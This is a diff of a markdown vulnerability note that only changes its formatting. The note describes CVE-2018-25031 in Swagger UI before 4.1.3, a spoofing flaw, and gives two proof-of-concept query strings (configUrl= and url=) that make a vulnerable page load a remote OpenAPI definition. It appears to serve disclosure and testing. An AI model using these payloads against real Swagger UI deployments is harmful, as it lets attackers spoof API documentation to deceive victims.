@@ -9,14 +9,15 @@
 
 
 ### Description:  
-## <div align="center">Swagger UI before 4.1.3 could allow a remote attacker to conduct spoofing attacks. By persuading a victim to open a crafted URL, an attacker could exploit this vulnerability to display remote OpenAPI definitions.
+#### <div align="center">Swagger UI before 4.1.3 could allow a remote attacker to conduct spoofing attacks. By persuading a victim to open a crafted URL, an attacker could exploit this vulnerability to display remote OpenAPI definitions.
+
+</div>  
+  
+<br/>   
 
 ### PoC:
 ```
 /index.html?configUrl=https://raw.githubusercontent.com/afine-com/CVE-2018-25031/main/poc.json
 /index.html?url=https://raw.githubusercontent.com/afine-com/CVE-2018-25031/main/poc.json
-
-</div>  
-  
-
-<br/>  
+```
+ 
